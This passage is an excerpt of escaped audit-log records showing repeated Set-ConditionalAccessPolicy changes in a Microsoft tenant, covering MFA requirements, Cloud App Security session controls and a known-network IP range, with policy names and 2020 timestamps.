'{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '6/24/2020 1:55:12 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '6/24/2020 1:55:13 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '6/24/2020 1:55:13 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '6/24/2020 5:12:12 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\4c5a5ea0-5d9f-4730-baaa-7a69cf29ef26', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/24/2020 5:12:15 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Semolen - Admin MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/25/2020 2:07:28 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '6/25/2020 2:07:28 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/26/2020 3:33:06 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '6/26/2020 3:33:05 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/26/2020 6:48:26 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '6/26/2020 6:48:26 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '6/27/2020 2:30:20 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '6/27/2020 2:30:20 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/27/2020 2:30:20 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '6/27/2020 2:30:20 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/27/2020 5:00:44 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/27/2020 5:00:44 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/28/2020 2:15:28 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/28/2020 2:15:28 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '6/28/2020 5:20:09 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\4c5a5ea0-5d9f-4730-baaa-7a69cf29ef26', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/28/2020 5:20:10 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Semolen - Admin MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-06-11T12:45:19.4695224Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '6/28/2020 5:20:11 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-06-11T12:45:19.4695224Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '6/28/2020 5:20:11 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/29/2020 1:51:34 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '6/29/2020 1:51:34 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '6/29/2020 4:43:10 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '6/29/2020 4:43:10 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '6/29/2020 4:43:13 AM', 